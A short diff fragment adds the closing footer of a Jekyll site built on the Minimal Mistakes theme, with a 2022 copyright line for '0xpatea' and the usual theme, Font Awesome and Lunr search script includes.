+<div class="page__footer-copyright">&copy; 2022 0xpatea. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
